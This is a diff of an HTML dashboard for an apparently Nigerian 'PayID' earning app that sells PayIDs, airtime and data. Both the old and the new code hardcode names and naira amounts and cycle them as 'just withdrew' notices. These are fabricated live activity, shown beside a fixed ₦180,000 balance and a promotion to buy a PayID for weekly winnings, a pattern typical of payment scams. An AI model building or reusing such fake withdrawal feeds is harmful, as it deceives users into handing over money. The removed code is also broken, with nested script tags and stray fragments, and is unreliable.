@@ -35,10 +35,6 @@
       align-items: center;
       justify-content: space-between;
     }
-    .header-top-left {
-      display: flex;
-      align-items: center;
-    }
     .profile-circle {
       width: 40px;
       height: 40px;
@@ -55,9 +51,6 @@
     .header-greeting {
       font-weight: 600;
       font-size: 20px;
-    }
-    .header-greeting span {
-      font-size: 22px;
     }
     .welcome-back {
       font-size: 14px;
@@ -138,15 +131,6 @@
       display: flex;
       align-items: center;
       gap: 8px;
-      transition: background 0.25s ease;
-    }
-    .header-button:hover {
-      background: #a463f8;
-    }
-    .header-button svg {
-      fill: white;
-      width: 18px;
-      height: 18px;
     }
     .menu-grid {
       margin: 30px 20px 10px;
@@ -159,28 +143,35 @@
       cursor: pointer;
       font-size: 13px;
       color: #222;
-      user-select: none;
     }
-    .menu-item svg, .menu-item img {
+    .menu-item svg {
       width: 30px;
       height: 30px;
       margin-bottom: 8px;
-      filter: drop-shadow(0 0 0.5px rgba(0,0,0,0.12));
-    }
-    .section-title {
-      font-weight: 700;
-      font-size: 20px;
-      margin: 24px 20px 8px;
+      fill: #7c20e6;
     }
     .carousel {
-      margin: 0 20px 40px;
+      margin: 30px 20px;
       border-radius: 12px;
       overflow: hidden;
+      position: relative;
     }
-    .carousel img {
+    .carousel-inner {
+      display: flex;
+      width: 300%;
+      transition: transform 0.6s ease;
+    }
+    .carousel-slide {
       width: 100%;
-      display: block;
-      border-radius: 12px;
+      flex-shrink: 0;
+      background: #8b5cf6;
+      color: #fff;
+      padding: 20px;
+    }
+    @keyframes slideBackForth {
+      0% { transform: translateX(0); }
+      50% { transform: translateX(calc(100% - 100vw)); }
+      100% { transform: translateX(0); }
     }
     @media (max-width: 480px) {
       .header-buttons {
@@ -196,104 +187,19 @@
 <body>
 
 <div class="user-register-banner">
-  <div class="announcement">
-  <span class="announcement-text">⚡️ Important Announcements:The Opay bank service is currently experiencing issues. Please use other supported banks for your payment! ⚡️</span>
+  ⚡️ Important Announcement: Opay bank service is currently experiencing issues. Please use other supported banks! ⚡️
 </div>
-<!-- Animated Withdrawal Announcement -->
+
 <div id="announcement-bar" style="background:#fffbe6;padding:10px;text-align:center;display:none;font-weight:600;color:#333;">
   <div id="announcement-text" class="fade-slide"></div>
 </div>
 
-<style>
-  .fade-slide {
-    opacity: 0;
-    transform: translateY(-10px);
-    transition: opacity 0.6s ease, transform 0.6s ease;
-  }
-  .fade-slide.show {
-    opacity: 1;
-    transform: translateY(0);
-  }
-</style>
-
-<script>
-  if (!localStorage.getItem("withdrawals")) {
-    localStorage.setItem("withdrawals", JSON.stringify([
-      { name: "Arabmoney", amount: 180000 },
-      { name: "maryam", amount: 90000 },
-      { name: "sale", amount: 120000 },
-      { name: "Ada", amount: 105000 },
-      { name: "Emmanuel", amount: 190000 },
-      { name: "sunday", amount: 150000 },
-      { name: "liberty", amount: 100000 },
-      { name: "sabastine", amount: 180000 },
-      { name: "Adebayo", amount: 170000},
-      
-    ]));
-  }
-
-  let w = JSON.parse(localStorage.getItem("withdrawals") || "[]").slice(-5);
-  if (w.length) {
-    let i = 0;
-    const bar = document.getElementById("announcement-bar");
-    const text = document.getElementById("announcement-text");
-    bar.style.display = "block";
-
-    function showNext() {
-      text.classList.remove("show");
-      setTimeout(() => {
-        let item = w[i];
-        text.textContent = `${item.name.toUpperCase()} just now withdraw ₦${Number(item.amount).toLocaleString()}`;
-        text.classList.add("show");
-        i = (i + 1) % w.length;
-      }, 300);
-    }
-
-    showNext();
-    setInterval(showNext, 30000); // every 4 seconds
-  }
-</script>
-<style>
-  .announcement {
-    width: 100%;
-    overflow: hidden;
-    background: #fffae6;
-    color: #333;
-    font-weight: 600;
-    font-size: 1.2rem;
-    padding: 10px 0;
-    box-sizing: border-box;
-    position: relative;
-  }
-
-  .announcement-text {
-    display: inline-block;
-    white-space: nowrap;
-    animation: slideBackForth 8s ease-in-out infinite;
-  }
-
-  @keyframes slideBackForth {
-    0% {
-      transform: translateX(0);
-    }
-    50% {
-      transform: translateX(calc(100% - 100vw));
-    }
-    100% {
-      transform: translateX(0);
-    }
-  }
-</style>
-</div>
-
-  }
-</script>
 <div class="header-card">
   <div class="header-top">
     <div class="header-top-left">
       <div class="profile-circle">K</div>
       <div>
-        <div class="header-greeting">Hi,Good Morning <span>👋</span></div>
+        <div class="header-greeting">Hi, Good Morning <span>👋</span></div>
         <div class="welcome-back">Welcome back!</div>
       </div>
     </div>
@@ -314,133 +220,98 @@
   <div class="weekly-rewards">Weekly Rewards: ₦180,000.00</div>
 
   <div class="header-buttons">
-    <button class="header-button" onclick="location.href='earn.html'">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16 9l-4 4-4-4"/></svg> Upgrade
-    </button>
-    <button class="header-button" onclick="location.href='withdraw.html'">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 16l4-4H8z"/></svg> Transfer
-    </button>
+    <button class="header-button" onclick="location.href='earn.html'">Upgrade</button>
+    <button class="header-button" onclick="location.href='withdraw.html'">Transfer</button>
   </div>
 </div>
 
 <div class="menu-grid">
-  <div class="menu-item" onclick="location.href='buy.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M20 6H4v12h16V6zm-2 9h-4v-2h4v2zm0-4h-4V9h4v2z"/></svg><div>Buy PAY ID</div></div>
-  <div class="menu-item" onclick="location.href='watch.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M21 6h-6l-2-2H9L7 6H3v12h18V6zM9 16l4-4-4-4v8z"/></svg><div>Watch</div></div>
-  <div class="menu-item" onclick="location.href='airtime.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M12 20c4.418 0 8-2.239 8-5v-2c0-2.761-3.582-5-8-5s-8 2.239-8 5v2c0 2.761 3.582 5 8 5z"/></svg><div>Airtime</div></div>
-  <div class="menu-item" onclick="location.href='data.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M3 12h18v6H3z"/></svg><div>Data</div></div>
-  <div class="menu-item" onclick="location.href='support.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 10 10A10.011 10.011 0 0 0 12 2zm1 15h-2v-2h2zm0-4h-2V7h2z"/></svg><div>Support</div></div>
-  <div class="menu-item" onclick="location.href='group.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M16 11a4 4 0 1 1-8 0 4 4 0 0 1 8 0zm-8 3v2H4v-2zm12 0v2h-4v-2z"/></svg><div>Group</div></div>
-  <div class="menu-item" onclick="location.href='earn.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M12 8l6 4-6 4V8z"/></svg><div>Earn More</div></div>
-  <div class="menu-item" onclick="location.href='profile.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 8-4 8-4s8 0 8 4z"/></svg><div>Profile</div></div>
+  <div class="menu-item" onclick="location.href='buy.html'">Buy PAY ID</div>
+  <div class="menu-item" onclick="location.href='watch.html'">Watch</div>
+  <div class="menu-item" onclick="location.href='airtime.html'">Airtime</div>
+  <div class="menu-item" onclick="location.href='data.html'">Data</div>
+  <div class="menu-item" onclick="location.href='support.html'">Support</div>
+  <div class="menu-item" onclick="location.href='group.html'">Group</div>
+  <div class="menu-item" onclick="location.href='earn.html'">Earn More</div>
+  <div class="menu-item" onclick="location.href='profile.html'">Profile</div>
 </div>
 
-<div style="font-family:sans-serif;">
-  <h3>Current Promotions</h3>
-  <div id="promo" style="overflow:hidden;border-radius:16px;width:100%;max-width:500px;margin:auto;position:relative;">
-  <div id="slides" style="display:flex;transition:transform 0.6s ease;width:300%;">
-  <div style="width:100%;flex-shrink:0;background:#8b5cf6;color:#fff;padding:20px;">
-  <h4>Win Big with PayID</h4>
-    <p>Buy Your PayID today and stand a chance 
-     to win ₦50,000 weekly !</p>
-  </div>
-    <div style="width:100%;flex-shrink:0;background:#8b5cf6;color:#fff;padding:20px;">
-    <h4>Data & Airtime Deals!</h4>
-    <p>Get the best rates on airtime and data
-     purchase. Save up to 15%!</p>
-  </div>
-    <div style="width:100%;flex-shrink:0;background:#8b5cf6;color:#fff;padding:20px;">
-    <h4>Instant Transfers</h4>
-    <p>Send money to any Nigerian bank account instantly with zero fees!</p>
-  </div>
+<div class="carousel">
+  <div class="carousel-inner" id="slides">
+    <div class="carousel-slide">
+      <h4>Win Big with PayID</h4>
+      <p>Buy Your PayID today and stand a chance to win ₦50,000 weekly!</p>
     </div>
-    <div style="position:absolute;bottom:10px;left:50%;transform:translateX(-50%);display:flex;gap:6px;">
-      <div id="dot0" style="width:8px;height:8px;border-radius:50%;background:#fff;"></div>
-      <div id="dot1" style="width:8px;height:8px;border-radius:50%;background:#ccc;"></div>
-      <div id="dot2" style="width:8px;height:8px;border-radius:50%;background:#ccc;"></div>
+    <div class="carousel-slide">
+      <h4>Data & Airtime Deals!</h4>
+      <p>Get the best rates on airtime and data purchase. Save up to 15%!</p>
     </div>
-   </div>
-   </div>
+    <div class="carousel-slide">
+      <h4>Instant Transfers</h4>
+      <p>Send money to any Nigerian bank instantly with zero fees!</p>
+    </div>
+  </div>
+</div>
 
-  <script>
-  let index = 0;
-  setInterval(() => {
-    index = (index + 1) % 3;
-    document.getElementById('slides').style.transform = `translateX(-${index * 100}%)`;
-    for (let i = 0; i < 3; i++) {
-      document.getElementById('dot' + i).style.background = (i === index) ? '#fff' : '#ccc';
-    }
-  }, 3000);
-</script>
 <script>
+  // Hide/show balance
+  let isHidden = false;
   function toggleBalanceVisibility() {
-    const balance = document.getElementById('balance-amount');
-    const eyeOpen = document.getElementById('eye-open');
-    const eyeClosed = document.getElementById('eye-closed');
-    if (balance.style.filter === 'blur(8px)') {
-      balance.style.filter = 'none';
-      eyeOpen.style.display = 'inline';
-      eyeClosed.style.display = 'none';
+    const amount = document.getElementById('balance-amount');
+    const open = document.getElementById('eye-open');
+    const closed = document.getElementById('eye-closed');
+    if (isHidden) {
+      amount.textContent = "180,000.00";
+      open.style.display = "inline";
+      closed.style.display = "none";
     } else {
-      balance.style.filter = 'blur(8px)';
-      eyeOpen.style.display = 'none';
-      eyeClosed.style.display = 'inline';
+      amount.textContent = "••••••••";
+      open.style.display = "none";
+      closed.style.display = "inline";
     }
+    isHidden = !isHidden;
   }
 
-  // Calculate new balance
-  <script>
-  // Set starting balance (only once, or when needed)
-  const startingBalance = 180000;
+  // Promotion slider
+  let currentSlide = 0;
+  const slides = document.getElementById('slides');
+  setInterval(() => {
+    currentSlide = (currentSlide + 1) % 3;
+    slides.style.transform = `translateX(-${currentSlide * 100}%)`;
+  }, 4000);
 
-  // Get transactions from localStorage
-  let transactions = JSON.parse(localStorage.getItem("transactions") || "[]");
-
-  // Calculate total spent
-  let totalSpent = 0;
-  transactions.forEach(tx => {
-    totalSpent += Number(tx.amount);
-  });
-
-  // Calculate new balance
-  let newBalance = startingBalance - totalSpent;
-
-  // Save the new balance to localStorage
-  localStorage.setItem("balance", newBalance);
-
-  // Display the balance on the page
-  document.getElementById("balance-amount").textContent =
-    newBalance.toLocaleString("en-NG", { style: "currency", currency: "NGN" });
-   function toggleBalance() {
-    const balance = document.getElementById("balance-amount");
-    const eyeOpen = document.getElementById("eye-open");
-    const eyeClosed = document.getElementById("eye-closed");
-
-    if (balance.textContent.includes("•")) {
-      // Show balance
-      const value = localStorage.getItem("balance") || 180000;
-      balance.textContent = Number(value).toLocaleString();
-      eyeOpen.style.display = "inline";
-      eyeClosed.style.display = "none";
-    } else {
-      // Hide balance
-      balance.textContent = "••••••";
-      eyeOpen.style.display = "none";
-      eyeClosed.style.display = "inline";
-    }
+  // Withdrawal notification animation
+  if (!localStorage.getItem("withdrawals")) {
+    localStorage.setItem("withdrawals", JSON.stringify([
+      { name: "Arabmoney", amount: 180000 },
+      { name: "Maryam", amount: 90000 },
+      { name: "Sale", amount: 120000 },
+      { name: "Ada", amount: 105000 },
+      { name: "Emmanuel", amount: 190000 },
+    ]));
   }
 
-  window.addEventListener("DOMContentLoaded", () => {
-    const value = localStorage.getItem("balance") || 180000;
-    document.getElementById("balance-amount").textContent = Number(value).toLocaleString();
+  let w = JSON.parse(localStorage.getItem("withdrawals") || "[]").slice(-5);
+  if (w.length) {
+    let i = 0;
+    const bar = document.getElementById("announcement-bar");
+    const text = document.getElementById("announcement-text");
+    bar.style.display = "block";
 
-    // Set initial visibility of eye icons
-    const eyeOpen = document.getElementById("eye-open");
-    const eyeClosed = document.getElementById("eye-closed");
-    if (eyeOpen && eyeClosed) {
-      eyeOpen.style.display = "inline";
-      eyeClosed.style.display = "none";
-      {minimuFractionDigit: 2 });
-      </script>  
+    function showNext() {
+      text.classList.remove("show");
+      setTimeout(() => {
+        let item = w[i];
+        text.textContent = `${item.name.toUpperCase()} just withdrew ₦${item.amount.toLocaleString()}`;
+        text.classList.add("show");
+        i = (i + 1) % w.length;
+      }, 300);
+    }
 
-      </body>
-      </html>
+    showNext();
+    setInterval(showNext, 4000);
+  }
+</script>
+
+</body>
+</html>
